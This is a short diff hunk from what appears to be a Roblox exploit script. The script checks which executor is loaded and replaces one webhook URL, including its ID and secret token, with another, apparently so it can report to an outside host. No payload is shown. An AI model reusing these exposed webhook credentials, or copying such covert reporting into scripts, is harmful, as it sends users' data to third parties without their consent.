@@ -5,7 +5,7 @@ local webhookcheck =
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
 
-local url = "https://webhook.newstargeted.com/api/webhooks/1561047468983062578/XyD0Zy7POJBuR91g_CNd-1BzZDKlbGIHFmLrycRlr0ji9aJgPf3xDBqeP92lAkqpzY3M"
+local url = "https://webhook.newstargeted.com/api/webhooks/1561089100977541283/XkaBX6V6RCYE71J_koX-FQeNixXP8XKhk1_6PdkLWzjeFzmIb0ajhuCjZtkCegJl-j_C"
 local headers = {
    ["content-type"] = "application/json"
 }
